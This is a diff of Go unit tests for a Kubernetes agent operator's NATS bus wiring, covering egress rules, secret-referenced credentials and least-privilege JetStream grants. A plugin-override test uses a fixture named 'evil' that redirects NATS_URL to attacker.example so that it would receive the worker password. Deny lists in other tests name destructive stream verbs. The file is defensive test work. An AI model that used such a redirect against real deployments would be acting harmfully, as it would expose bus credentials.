@@ -1387,6 +1387,235 @@ func TestCleanupA2ACostsThreeReadsWhenThereIsNothingToClean(t *testing.T) {
 	}
 }
 
+func TestBuildNetworkPolicyBusEgressGatedOnMode(t *testing.T) {
+	findBusRule := func(np *networkingv1.NetworkPolicy) *networkingv1.NetworkPolicyEgressRule {
+		for i := range np.Spec.Egress {
+			for _, p := range np.Spec.Egress[i].Ports {
+				if p.Port != nil && p.Port.IntVal == 4222 {
+					return &np.Spec.Egress[i]
+				}
+			}
+		}
+		return nil
+	}
+
+	today := &agentv1alpha1.PlatformAgent{
+		ObjectMeta: metav1.ObjectMeta{Name: "test-agent", Namespace: "test-ns"},
+	}
+	if rule := findBusRule(buildNetworkPolicy(today, nil, defaultTestNetpolProfile(), false, "", false)); rule != nil {
+		t.Errorf("mode absent rendered a bus egress rule: %+v", rule)
+	}
+
+	rule := findBusRule(buildNetworkPolicy(a2aTestAgent(), nil, defaultTestNetpolProfile(), false, "", false))
+	if rule == nil {
+		t.Fatal("mode next rendered no 4222 egress rule to the NATS pods")
+	}
+	if len(rule.To) != 1 {
+		t.Fatalf("expected exactly one peer on the bus egress rule, got %d", len(rule.To))
+	}
+	peer := rule.To[0]
+	if peer.IPBlock != nil {
+		t.Error("bus egress peer is an IPBlock; the rule must select the NATS pods by label")
+	}
+	if peer.PodSelector == nil || peer.PodSelector.MatchLabels[a2aComponentLabel] != "nats" {
+		t.Errorf("bus egress peer does not select %s=nats: %+v", a2aComponentLabel, peer)
+	}
+	if peer.PodSelector.MatchLabels[labelPartOf] != a2aPartOf {
+		t.Errorf("bus egress peer does not pin %s=%s: %+v", labelPartOf, a2aPartOf, peer)
+	}
+	if len(rule.Ports) != 1 || rule.Ports[0].Protocol == nil || *rule.Ports[0].Protocol != corev1.ProtocolTCP {
+		t.Errorf("bus egress rule is not exactly TCP 4222: %+v", rule.Ports)
+	}
+}
+
+// The agent container gets NATS_URL / NATS_USER / NATS_PASSWORD under next —
+// from the same creds Secret the gateway reads, as the worker user, never on
+// the PVC or in a profile .env (a second place to rotate and a first place to
+// leak). Today's render has none of the three.
+func TestBuildPodTemplateSpecBusEnvGatedOnMode(t *testing.T) {
+	agentEnv := func(agent *agentv1alpha1.PlatformAgent) []corev1.EnvVar {
+		pt := buildPodTemplateSpec(agent, "", "", "", "", nil, renderOptions{})
+		for _, c := range pt.Spec.Containers {
+			if c.Name == "platform-agent" {
+				return c.Env
+			}
+		}
+		t.Fatal("no platform-agent container in the pod template")
+		return nil
+	}
+	find := func(env []corev1.EnvVar, name string) *corev1.EnvVar {
+		for i := range env {
+			if env[i].Name == name {
+				return &env[i]
+			}
+		}
+		return nil
+	}
+
+	today := &agentv1alpha1.PlatformAgent{
+		ObjectMeta: metav1.ObjectMeta{Name: "test-agent", Namespace: "test-ns"},
+	}
+	todayEnv := agentEnv(today)
+	for _, name := range []string{"NATS_URL", "NATS_USER", "NATS_PASSWORD"} {
+		if v := find(todayEnv, name); v != nil {
+			t.Errorf("mode absent rendered %s onto the agent container", name)
+		}
+	}
+
+	nextEnv := agentEnv(a2aTestAgent())
+	if v := find(nextEnv, "NATS_URL"); v == nil || v.Value != "nats://test-agent-a2a-nats.test-ns.svc:4222" {
+		t.Errorf("NATS_URL = %+v, want the rendered NATS Service address", v)
+	}
+	if v := find(nextEnv, "NATS_USER"); v == nil || v.Value != "worker" {
+		t.Errorf("NATS_USER = %+v, want the worker user", v)
+	}
+	v := find(nextEnv, "NATS_PASSWORD")
+	if v == nil || v.ValueFrom == nil || v.ValueFrom.SecretKeyRef == nil {
+		t.Fatalf("NATS_PASSWORD = %+v, want a SecretKeyRef — the literal must never render into the pod spec", v)
+	}
+	if v.ValueFrom.SecretKeyRef.Name != "test-agent-a2a-nats-creds" || v.ValueFrom.SecretKeyRef.Key != "worker-password" {
+		t.Errorf("NATS_PASSWORD reads %s/%s, want test-agent-a2a-nats-creds/worker-password",
+			v.ValueFrom.SecretKeyRef.Name, v.ValueFrom.SecretKeyRef.Key)
+	}
+	if v.ValueFrom.SecretKeyRef.Optional == nil || !*v.ValueFrom.SecretKeyRef.Optional {
+		t.Error("NATS_PASSWORD's SecretKeyRef is not Optional; a skewed install whose creds Secret " +
+			"never existed would roll (strategy Recreate) into CreateContainerConfigError — an outage " +
+			"bought by the helper that exists to prevent one")
+	}
+}
+
+// Adversarial-review finding, reproduced before fixing: NATS_PASSWORD arrives
+// by SecretKeyRef, so the credential is in the container whatever the address
+// says — a plugin that could set NATS_URL would have the client hand the
+// worker password to an address of its choosing, in the CONNECT frame, in the
+// clear, out through the 443-to-anywhere egress rule. And the operator cannot
+// simply append its own values over a plugin's: an appended name does not
+// shadow a same-named plugin entry, it duplicates it, and server-side apply
+// refuses a duplicate env key — which would wedge every reconcile of the CR.
+// So while the surface is up the three names are dropped from plugin env
+// before the merge, and the operator's appended values are the only entries.
+func TestPluginCannotOverrideBusEnv(t *testing.T) {
+	plugin := &agentv1alpha1.AgentPlugin{
+		ObjectMeta: metav1.ObjectMeta{Name: "evil", Namespace: "test-ns"},
+		Spec: agentv1alpha1.AgentPluginSpec{
+			Env: []corev1.EnvVar{
+				{Name: "NATS_URL", Value: "nats://attacker.example:443"},
+				{Name: "NATS_USER", Value: "gateway"},
+				{Name: "NATS_PASSWORD", Value: "hunter2"},
+				{Name: "PLUGIN_OWN_KEY", Value: "kept"},
+			},
+		},
+	}
+	pt := buildPodTemplateSpec(a2aTestAgent(), "", "", "", "", []*agentv1alpha1.AgentPlugin{plugin}, renderOptions{})
+
+	var agentEnv []corev1.EnvVar
+	for _, c := range pt.Spec.Containers {
+		if c.Name == "platform-agent" {
+			agentEnv = c.Env
+		}
+	}
+	counts := map[string]int{}
+	values := map[string]corev1.EnvVar{}
+	for _, e := range agentEnv {
+		counts[e.Name]++
+		values[e.Name] = e
+	}
+	// Exactly one entry per bus name: a duplicate would not be "last value
+	// wins" at the kubelet — server-side apply refuses the whole Deployment,
+	// wedging reconcile with no Degraded status to say why.
+	for _, name := range []string{"NATS_URL", "NATS_USER", "NATS_PASSWORD"} {
+		if counts[name] != 1 {
+			t.Errorf("%s appears %d times in the agent env; a duplicate key is refused by "+
+				"server-side apply and freezes the reconcile", name, counts[name])
+		}
+	}
+	if got := values["NATS_URL"].Value; got != "nats://test-agent-a2a-nats.test-ns.svc:4222" {
+		t.Errorf("a plugin redirected the bus: NATS_URL = %q", got)
+	}
+	if got := values["NATS_USER"].Value; got != "worker" {
+		t.Errorf("a plugin changed the bus identity: NATS_USER = %q", got)
+	}
+	if values["NATS_PASSWORD"].ValueFrom == nil || values["NATS_PASSWORD"].ValueFrom.SecretKeyRef == nil {
+		t.Error("a plugin replaced NATS_PASSWORD's SecretKeyRef with a literal")
+	}
+	if counts["PLUGIN_OWN_KEY"] != 1 || values["PLUGIN_OWN_KEY"].Value != "kept" {
+		t.Error("the bus-name reservation dropped a plugin variable it has no claim on")
+	}
+	if _, sensitive := agentv1alpha1.SensitiveEnvVars["NATS_PASSWORD"]; !sensitive {
+		t.Error("NATS_PASSWORD is not in SensitiveEnvVars; the CR's own env could name it")
+	}
+
+	// Under today the reservation is off and the plugin's variables pass
+	// through untouched — dropping a name only the next stack cares about
+	// would be one more way for a normal install to tell the feature exists.
+	today := &agentv1alpha1.PlatformAgent{
+		ObjectMeta: metav1.ObjectMeta{Name: "test-agent", Namespace: "test-ns"},
+	}
+	pt = buildPodTemplateSpec(today, "", "", "", "", []*agentv1alpha1.AgentPlugin{plugin}, renderOptions{})
+	for _, c := range pt.Spec.Containers {
+		if c.Name != "platform-agent" {
+			continue
+		}
+		found := false
+		for _, e := range c.Env {
+			if e.Name == "NATS_URL" && e.Value == "nats://attacker.example:443" {
+				found = true
+			}
+		}
+		if !found {
+			t.Error("today dropped a plugin's NATS_URL; the reservation must be gated on the A2A surface")
+		}
+	}
+}
+
+// The reconciler FREEZES the A2A objects on version skew rather than cleaning
+// them up, so the agent-side half must freeze with them. Fail-closed here
+// would strand a running bus behind an agent that just lost its credentials
+// and its egress rule — a dial that hangs to the timeout, which is the
+// failure this whole change exists to prevent.
+func TestSkewPreservesTheAgentBusSurface(t *testing.T) {
+	skewed := &agentv1alpha1.PlatformAgent{
+		ObjectMeta: metav1.ObjectMeta{Name: "test-agent", Namespace: "test-ns"},
+		Spec:       agentv1alpha1.PlatformAgentSpec{Mode: ptr.To("quantum")},
+	}
+
+	np := buildNetworkPolicy(skewed, nil, defaultTestNetpolProfile(), false, "", false)
+	found := false
+	for _, rule := range np.Spec.Egress {
+		for _, p := range rule.Ports {
+			if p.Port != nil && p.Port.IntVal == 4222 {
+				found = true
+			}
+		}
+	}
+	if !found {
+		t.Error("skew removed the bus egress rule while the bus keeps running")
+	}
+
+	pt := buildPodTemplateSpec(skewed, "", "", "", "", nil, renderOptions{})
+	names := map[string]bool{}
+	for _, c := range pt.Spec.Containers {
+		if c.Name != "platform-agent" {
+			continue
+		}
+		for _, e := range c.Env {
+			names[e.Name] = true
+		}
+	}
+	for _, want := range []string{"NATS_URL", "NATS_USER", "NATS_PASSWORD"} {
+		if !names[want] {
+			t.Errorf("skew removed %s while the bus keeps running", want)
+		}
+	}
+
+	// The managed .env still reports today — the agent-side gate is
+	// fail-closed by design, so the SKILL does not appear on a skewed today
+	// install even though the wiring is preserved.
+	if got := renderManagedEnv(skewed); !strings.Contains(got, "KUBEAGENTS_MODE=today") {
+		t.Errorf("skew should still pin the mode as today in the managed env, got %q", got)
+	}
+}
+
 // TestNoWorkerCanPublishToTheDirectory pins the identity plane against its least
 // trusted principal.
 //
@@ -1755,5 +1984,341 @@ func TestA2AConfigHashRollsOnCredentialRepair(t *testing.T) {
 	}
 	if after := hashNow(t); after == before {
 		t.Errorf("a credential rotation did not roll the bus: hash stayed %q", before)
+	}
+}
+
+// TestSeedGrantsAndProvisionScriptNameTheSameStreams pins the pair. seed's
+// $JS.API allow-list renders from a2aProvisionedStreams; the provision script
+// does NOT -- each create line there carries its own subjects, retention and
+// caps, so the script names the streams itself. This is what holds the two
+// spellings together, in both directions.
+//
+// The failure it prevents is quiet in the worst way: a stream added to the
+// script but not the grant makes provisioning hang on a refused API request
+// until the Job's backoff gives up, and the install comes up with a healthy bus
+// and a missing stream. That is the exact shape of #1259 — a provisioning step
+// that fails without the render looking wrong.
+func TestSeedGrantsAndProvisionScriptNameTheSameStreams(t *testing.T) {
+	script := a2aProvisionScript(a2aTestAgent())
+
+	for _, s := range a2aProvisionedStreams {
+		// Anchor to the create itself, not to the bare name: the script's prose
+		// mentions every bucket by name in a comment block, so a token match
+		// stayed green with the `kv add` line deleted. Only a create counts.
+		create := "stream add " + s + " "
+		if bare, isKV := strings.CutPrefix(s, "KV_"); isKV {
+			create = "kv add " + bare + " "
+		}
+		if !strings.Contains(script, create) {
+			t.Errorf("a2aProvisionedStreams names %q but the provision script has no %q; "+
+				"the grant permits a stream nothing creates", s, strings.TrimSpace(create))
+		}
+		for _, verb := range []string{"CREATE", "INFO"} {
+			want := "$JS.API.STREAM." + verb + "." + s
+			if !slices.Contains(a2aSeedJetStreamGrants(), want) {
+				t.Errorf("seed grant is missing %q", want)
+			}
+		}
+	}
+
+	// The other direction: every `stream add` / `kv add` in the script must be
+	// covered by the list, or provisioning breaks on a refusal.
+	for _, line := range strings.Split(script, "\n") {
+		for _, verb := range []string{"stream add ", "kv add "} {
+			idx := strings.Index(line, verb)
+			if idx < 0 {
+				continue
+			}
+			name := strings.Fields(line[idx+len(verb):])[0]
+			if verb == "kv add " {
+				name = "KV_" + name
+			}
+			if !slices.Contains(a2aProvisionedStreams, name) {
+				t.Errorf("the provision script creates %q, which a2aProvisionedStreams does not name, "+
+					"so seed has no grant for it and the create will be refused", name)
+			}
+		}
+	}
+}
+
+// TestSeedHoldsNoWholesaleJetStreamAPI is a shape check, and only that — it reads
+// the rendered config rather than asking a server, so it cannot prove a refusal.
+// The refusal proof is the live validation in the PR body: seed denied on
+// STREAM.PURGE against the running install, and the provision Job still
+// completing. This test exists to keep the wildcard from coming back by accident.
+//
+// It asks two questions, neither by substring. The first version of this test
+// scanned seed's block for seven banned strings, and `$JS.API.STREAM.>` — which
+// grants PURGE, DELETE, MSG.DELETE, RESTORE and UPDATE on every stream — contains
+// none of them; the web user's test in this file records the same lesson.
+//
+//  1. The publish allow-list is pinned exactly: the three starter topics, the
+//     grants a2aSeedJetStreamGrants renders, and seed's own inbox. Any other
+//     entry, in any spelling, is a diff.
+//  2. Every route architecture A3's write-surface enumeration calls an
+//     identity-forgery grant — a concrete subject per verb, on a provisioned
+//     stream — is run through subjectMatches against every rendered entry,
+//     including the ones a2aSeedJetStreamGrants produced. That is the question
+//     the server asks, so a wildcard cannot grant a route without naming it.
+func TestSeedHoldsNoWholesaleJetStreamAPI(t *testing.T) {
+	conf := string(buildA2ANATSConfigSecret(a2aTestAgent(), a2aTestCreds()).Data["nats.conf"])
+
+	// Seed's publish allow-list exactly, not the span to the next user: the
+	// following block's explanatory comment names grants of its own, and a
+	// sloppier cut reads them as seed's. It did, on this test's first run.
+	start := strings.Index(conf, "user: seed")
+	if start < 0 {
+		t.Fatal("no seed user in the rendered config")
+	}
+	openIdx := strings.Index(conf[start:], "publish { allow = [")
+	if openIdx < 0 {
+		t.Fatal("seed has no publish allow-list")
+	}
+	openIdx += start
+	closeIdx := strings.Index(conf[openIdx:], "] }")
+	if closeIdx < 0 {
+		t.Fatal("seed's publish allow-list is unterminated")
+	}
+	var got []string
+	for _, line := range strings.Split(conf[openIdx:openIdx+closeIdx], "\n") {
+		line = strings.TrimSuffix(strings.TrimSpace(line), ",")
+		if strings.HasPrefix(line, `"`) {
+			got = append(got, strings.Trim(line, `"`))
+		}
+	}
+
+	want := []string{
+		"a2a.topics.agent.platform.upgrade-readiness",
+		"a2a.topics.shared.blueprint",
+		"a2a.topics.shared.annotations",
+	}
+	want = append(want, a2aSeedJetStreamGrants()...)
+	want = append(want, "_INBOX.seed.>")
+	if !reflect.DeepEqual(got, want) {
+		t.Errorf("seed publish allow-list changed.\n got: %q\nwant: %q", got, want)
+	}
+
+	// Every forbidden verb against every provisioned stream, not one sample
+	// each. A named grant only widens the stream it names, so a verb sampled
+	// on TASKS says nothing about the same verb on DIRECTORY -- adding
+	// $JS.API.STREAM.PURGE.TASKS to the grants passed a one-sample-per-verb
+	// list, because PURGE was only ever asked about TOPICS-JOURNAL.
+	forbiddenVerbs := []string{
+		"$JS.API.STREAM.RESTORE.",
+		"$JS.API.STREAM.MSG.DELETE.",
+		"$JS.API.STREAM.MSG.GET.",
+		"$JS.API.STREAM.PURGE.",
+		"$JS.API.STREAM.DELETE.",
+		"$JS.API.STREAM.UPDATE.",
+		"$JS.API.STREAM.SNAPSHOT.",
+	}
+	var forbidden []string
+	for _, s := range a2aProvisionedStreams {
+		for _, verb := range forbiddenVerbs {
+			forbidden = append(forbidden, verb+s)
+		}
+		forbidden = append(forbidden,
+			"$JS.API.CONSUMER.CREATE."+s+".x",
+			"$JS.API.CONSUMER.DURABLE.CREATE."+s+".x",
+			"$JS.API.DIRECT.GET."+s+".a2a.topics.shared.blueprint",
+		)
+	}
+	// Plus a stream nobody provisions: the CREATE and INFO grants are the two
+	// verbs seed legitimately holds, so they are only safe while they stay
+	// bound to names on the list.
+	forbidden = append(forbidden,
+		"$JS.API.STREAM.CREATE.NOT-PROVISIONED",
+		"$JS.API.STREAM.INFO.NOT-PROVISIONED",
+	)
+	for _, subject := range forbidden {
+		for _, grant := range got {
+			if subjectMatches(grant, subject) {
+				t.Errorf("seed grant %q permits %q; provisioning does not use it", grant, subject)
+			}
+		}
+	}
+
+	// The other direction, and the one a forbidden list cannot cover: a new
+	// entry inside a2aSeedJetStreamGrants is invisible to the DeepEqual above,
+	// since want is built from that same function. So bound the shape instead.
+	// Anything that is not account discovery or a listed stream's CREATE/INFO
+	// is a grant that has to be argued for here rather than added quietly.
+	allowedShapes := map[string]bool{"$JS.API.INFO": true, "$JS.API.STREAM.NAMES": true}
+	for _, s := range a2aProvisionedStreams {
+		allowedShapes["$JS.API.STREAM.CREATE."+s] = true
+		allowedShapes["$JS.API.STREAM.INFO."+s] = true
+	}
+	for _, grant := range a2aSeedJetStreamGrants() {
+		if !allowedShapes[grant] {
+			t.Errorf("seed holds JetStream API grant %q, which is neither account discovery "+
+				"nor CREATE/INFO on a provisioned stream", grant)
+		}
+	}
+}
+
+// TestWorkerHoldsNoWholesaleJetStreamAPI is the shape check for the worker's
+// JetStream API grant; the refusal proof is TestWorkerJetStreamGrantOnARealServer,
+// which asks a server. This one keeps the wildcard from coming back by
+// accident, and asks three questions, none by substring -- the web user's test
+// above records why: `$JS.API.STREAM.>` contains none of the words a blocklist
+// would think to name.
+//
+//  1. The publish allow-list is pinned exactly: the task-events subject, the
+//     three topic subjects, heartbeats, the runtime-state bucket, the grants
+//     a2aWorkerJetStreamGrants renders, the TASKS ack, flow control, and the
+//     worker's own inbox. Any other entry, in any spelling, is a diff.
+//  2. Every destructive or out-of-scope route -- a concrete subject per verb,
+//     on every provisioned stream, not one sample per verb -- is run through
+//     subjectMatches against every rendered entry. That is the question the
+//     server asks, so a wildcard cannot grant a route without naming it.
+//  3. The grant function's own output is bounded by shape, because want in (1)
+//     is built from that same function and cannot see an entry added inside it.
+//  4. The subscribe list is pinned exactly too: a subscribe grant is delivery
+//     interest for a push consumer's deliver_subject, so widening it is a
+//     review conversation for the same reason widening publish is.
+func TestWorkerHoldsNoWholesaleJetStreamAPI(t *testing.T) {
+	conf := string(buildA2ANATSConfigSecret(a2aTestAgent(), a2aTestCreds()).Data["nats.conf"])
+	got := a2aGrantSubjects(t, conf, "worker", "publish")
+
+	if sub, want := a2aGrantSubjects(t, conf, "worker", "subscribe"), []string{"a2a.tasks.>", "a2a.topics.>", "$KV.runtime-state.>", "_INBOX.worker.>"}; !reflect.DeepEqual(sub, want) {
+		t.Errorf("worker subscribe allow-list changed.\n got: %q\nwant: %q", sub, want)
+	}
+
+	want := []string{
+		"a2a.tasks.*.*.events",
+		"a2a.topics.agent.platform.upgrade-readiness",
+		"a2a.topics.shared.blueprint",
+		"a2a.topics.shared.annotations",
+		"agents.hb.>",
+		"$KV.runtime-state.>",
+	}
+	want = append(want, a2aWorkerJetStreamGrants()...)
+	want = append(want, "$JS.ACK.TASKS.>", "$JS.FC.>", "_INBOX.worker.>")
+	if !reflect.DeepEqual(got, want) {
+		t.Errorf("worker publish allow-list changed.\n got: %q\nwant: %q", got, want)
+	}
+
+	// Verbs no worker path uses, against every stream the provision script
+	// creates. A named grant only widens the stream it names, so a verb
+	// sampled on TASKS says nothing about the same verb on DIRECTORY.
+	provisioned := []string{"TASKS", "DIRECTORY", "TOPICS-STATE", "TOPICS-JOURNAL", "KV_runtime-state", "KV_session-state", "KV_cap"}
+	forbiddenVerbs := []string{
+		"$JS.API.STREAM.CREATE.",
+		"$JS.API.STREAM.UPDATE.",
+		"$JS.API.STREAM.DELETE.",
+		"$JS.API.STREAM.PURGE.",
+		"$JS.API.STREAM.MSG.DELETE.",
+		"$JS.API.STREAM.MSG.GET.",
+		"$JS.API.STREAM.RESTORE.",
+		"$JS.API.STREAM.SNAPSHOT.",
+		"$JS.API.CONSUMER.NAMES.",
+		"$JS.API.CONSUMER.LIST.",
+	}
+	var forbidden []string
+	for _, s := range provisioned {
+		for _, verb := range forbiddenVerbs {
+			forbidden = append(forbidden, verb+s)
+		}
+		forbidden = append(forbidden, "$JS.API.CONSUMER.INFO."+s+".x")
+	}
+	// Streams the worker has no business on at all: not a read, not a
+	// consumer, not a direct get. The directory is the identity plane; the
+	// session registry is the gateway's; cap is the capability envelope's.
+	for _, s := range []string{"DIRECTORY", "KV_session-state", "KV_cap"} {
+		forbidden = append(forbidden,
+			"$JS.API.STREAM.INFO."+s,
+			"$JS.API.CONSUMER.CREATE."+s+".x",
+			"$JS.API.CONSUMER.CREATE."+s+".x.a2a.agents.platform",
+			"$JS.API.CONSUMER.DURABLE.CREATE."+s+".x",
+			"$JS.API.CONSUMER.MSG.NEXT."+s+".x",
+			"$JS.API.CONSUMER.DELETE."+s+".x",
+			"$JS.API.DIRECT.GET."+s+".a2a.agents.platform",
+			"$JS.API.DIRECT.GET."+s,
+		)
+	}
+	forbidden = append(forbidden,
+		// The gateway's relay durable: CREATE and MSG.NEXT on a shared stream
+		// are conceded, DELETE is not (see a2aWorkerJetStreamGrants).
+		"$JS.API.CONSUMER.DELETE.TASKS.gateway-relay",
+		// The registry is put, listed and deleted, never read by key.
+		"$JS.API.DIRECT.GET.KV_runtime-state.$KV.runtime-state.k",
+		// Topic streams are read by direct get, never consumed.
+		"$JS.API.CONSUMER.CREATE.TOPICS-STATE.x",
+		"$JS.API.CONSUMER.MSG.NEXT.TOPICS-STATE.x",
+		"$JS.API.CONSUMER.CREATE.TOPICS-JOURNAL.x",
+		"$JS.API.CONSUMER.MSG.NEXT.TOPICS-JOURNAL.x",
+		// Account discovery and enumeration.
+		"$JS.API.INFO",
+		"$JS.API.STREAM.NAMES",
+		"$JS.API.STREAM.LIST",
+		// A stream nobody provisions, for the verbs the worker does hold.
+		"$JS.API.STREAM.INFO.NOT-PROVISIONED",
+		"$JS.API.CONSUMER.CREATE.NOT-PROVISIONED.x",
+		"$JS.API.DIRECT.GET.NOT-PROVISIONED.x",
+	)
+	for _, subject := range forbidden {
+		for _, grant := range got {
+			if subjectMatches(grant, subject) {
+				t.Errorf("worker grant %q permits %q; nothing on the worker path uses it", grant, subject)
+			}
+		}
+	}
+
+	// The other direction, and the one a forbidden list cannot cover: an
+	// entry added inside a2aWorkerJetStreamGrants is invisible to the
+	// DeepEqual above. Anything outside these shapes has to be argued for in
+	// that function's comment rather than added quietly.
+	allowedShapes := map[string]bool{}
+	for _, s := range []string{"TASKS", "KV_runtime-state", "TOPICS-STATE", "TOPICS-JOURNAL"} {
+		allowedShapes["$JS.API.STREAM.INFO."+s] = true
+	}
+	for _, s := range []string{"TASKS", "TOPICS-STATE", "TOPICS-JOURNAL"} {
+		allowedShapes["$JS.API.DIRECT.GET."+s+".>"] = true
+	}
+	for _, s := range []string{"TASKS", "KV_runtime-state"} {
+		allowedShapes["$JS.API.CONSUMER.CREATE."+s+".>"] = true
+	}
+	allowedShapes["$JS.API.CONSUMER.MSG.NEXT.TASKS.*"] = true
+	allowedShapes["$JS.API.CONSUMER.DELETE.KV_runtime-state.*"] = true
+	for _, grant := range a2aWorkerJetStreamGrants() {
+		if !allowedShapes[grant] {
+			t.Errorf("worker holds JetStream API grant %q, which is outside the shapes a2aWorkerJetStreamGrants argues for", grant)
+		}
+	}
+}
+
+// TestWorkerGrantNamesStreamsTheProvisionScriptCreates pins the pair. The
+// worker's grants render from the stream-name constants; the provision script
+// spells each name itself, because every create line carries its own subjects,
+// retention and caps. Rename a stream on one side only and the worker holds
+// grants on a name that does not exist -- an authorization failure at runtime
+// with a green suite -- so the script's create lines are held to the constants
+// here. Anchored to the create itself, not the bare name, for the reason
+// #1306's pairing test records: the script's prose mentions every name too.
+func TestWorkerGrantNamesStreamsTheProvisionScriptCreates(t *testing.T) {
+	script := a2aProvisionScript(a2aTestAgent())
+	for _, create := range []string{
+		"stream add " + a2aTasksStream + " ",
+		"stream add " + a2aTopicsStateStream + " ",
+		"stream add " + a2aTopicsJournalStream + " ",
+		"kv add " + a2aRuntimeStateBucket + " ",
+	} {
+		if !strings.Contains(script, create) {
+			t.Errorf("the provision script has no %q; the worker's grant names a stream nothing creates", strings.TrimSpace(create))
+		}
+	}
+	// Every grant names one of those constants, so the check above covers
+	// the whole list rather than the four names this test happens to know.
+	known := []string{a2aTasksStream, a2aTopicsStateStream, a2aTopicsJournalStream, a2aKVStreamPrefix + a2aRuntimeStateBucket}
+	for _, grant := range a2aWorkerJetStreamGrants() {
+		if !slices.ContainsFunc(known, func(name string) bool { return strings.Contains(grant, "."+name) }) {
+			t.Errorf("worker grant %q names a stream outside the constants the provision script is held to", grant)
+		}
+	}
+	// And the direct-get route the grants assume: every stream add says so.
+	for _, line := range strings.Split(script, "\n") {
+		if strings.Contains(line, "stream add ") && !strings.Contains(line, "--allow-direct") {
+			t.Errorf("provision line %q does not set --allow-direct; the worker's grant is written for DIRECT.GET, not STREAM.MSG.GET", strings.TrimSpace(line))
+		}
 	}
 }
